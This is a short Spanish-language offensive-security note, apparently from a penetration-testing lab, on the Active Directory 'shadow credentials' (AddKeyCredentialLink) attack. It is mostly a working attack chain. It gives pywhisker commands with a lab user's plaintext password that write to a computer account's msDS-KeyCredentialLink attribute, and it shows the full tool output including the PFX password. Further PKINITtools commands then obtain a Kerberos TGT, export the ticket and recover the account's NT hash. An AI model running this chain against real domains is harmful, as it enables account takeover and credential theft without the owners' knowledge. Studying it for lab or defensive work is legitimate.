# AddKeyCredentialLink Attack
## ¿Qué es?
- Es un ataque que permite a un atacante agregar credenciales a un usuario sin necesidad de conocer la contraseña.
- Se puede hacer con cualquier usuario, pero es más efectivo con usuarios de alto privilegio.

#### [Video](https://youtu.be/oyTEaYNs53w)

## Ataque explicado

![alt text](./AddKeyCredentialLink.png)

- En este ejemplo el usuario **marcus** puede agregar credenciales a la computadora **ZPH-SVRMGMT1.ZSM.LOCAL**.
- Entonces lo que podemos hacer es usar la herramienta pywhisker para agregar credenciales a un usuario sin necesidad de conocer la contraseña.
    - `python3 pywhisker.py -d "zsm.local" -u "marcus" -p '!QAZ2wsx' --target "ZPH-SVRMGMT1$" --action "add"`

```
... etc
--target "ZPH-SVRMGMT1$" --action "add"
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 65727581-ddcd-d67a-efb2-b30390b73d68
[*] Updating the msDS-KeyCredentialLink attribute of ZPH-SVRMGMT1$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 3cwbk8w6.pfx
[+] PFX exportiert nach: 3cwbk8w6.pfx
[i] Passwort für PFX: LlnaSQgj2Xgivmptjc7S
[+] Saved PFX (#PKCS12) certificate & key at path: 3cwbk8w6.pfx
[*] Must be used with password: LlnaSQgj2Xgivmptjc7S
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

- Importante la contraseña: **LlnaSQgj2Xgivmptjc7S**

- Luego con la otra herramienta PKINITtools podemos obtener un TGT.
    - `python3 gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem DOMAIN/USER`
    - en este caso sería: `python3 gettgtpkinit.py -cert-pem 3cwbk8w6.pem -key-pem 3cwbk8w6.key ZSM.LOCAL/marcus cache.ccache`
- Después hay que exportar el ticket: `export KRB5CCNAME=$PWD/cache.ccache`
- Fijamos que esté cargado con `klist`

## Conseguir NT hash del usuario
- El comando anterior nos tuvo que haber dado un as-rep hash.
- Con este hash podemos solicitar con getnthash.py el NT.
- `python3 getnthash.py -key AS-REP-ENCRYPTION-KEY DOMAIN/USER`
- Y esto te va a dar el NT-HASH recuperado.